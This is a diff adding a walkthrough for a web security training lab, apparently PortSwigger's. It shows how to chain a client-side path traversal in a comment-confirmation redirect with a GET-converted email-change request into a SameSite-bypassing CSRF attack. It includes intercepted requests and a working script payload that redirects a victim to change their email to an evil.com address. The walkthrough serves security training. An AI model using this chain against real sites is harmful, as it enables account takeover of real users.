@@ -1,0 +1,43 @@
+Log in to the lab using:
+Username: wiener
+Password: peter
+Open any blog post.
+Submit a random comment.
+After submitting the comment, observe the URL:
+/post/comment/confirmation?postId=1
+In Burp Suite, go to:
+Proxy → HTTP history
+Find the request for:
+/resources/js/commentConfirmationRedirect.js
+Observe that the JavaScript uses the postId parameter to create a client-side redirect.
+Test path traversal in browser:
+https://0abc006c042a9dc680911227005c0006.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account
+Confirm that the browser redirects to /my-account.
+Change your email once and intercept the request in Burp Suite.
+Observe the request:
+POST /my-account/change-email HTTP/2
+Host: 0abc006c042a9dc680911227005c0006.web-security-academy.net
+
+email=test@test.com&submit=1
+Send the request to Burp Repeater.
+Right-click the request and select:
+Change request method
+Burp converts it into:
+GET /my-account/change-email?email=test@test.com&submit=1 HTTP/2
+Host: 0abc006c042a9dc680911227005c0006.web-security-academy.net
+Send the request and confirm the email changes successfully.
+Open the Exploit Server.
+Paste the following payload into the Body section:
+<script>
+document.location="https://0abc006c042a9dc680911227005c0006.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=finalvictim2026@evil.com%26submit=1";
+</script>
+Click Store.
+Click View exploit and confirm your email changes.
+Change the email address to a fresh unused email.
+
+Example:
+
+solve9981@evil.com
+Click Store again.
+Click Deliver to victim.
+After a few seconds, the lab will be solved.
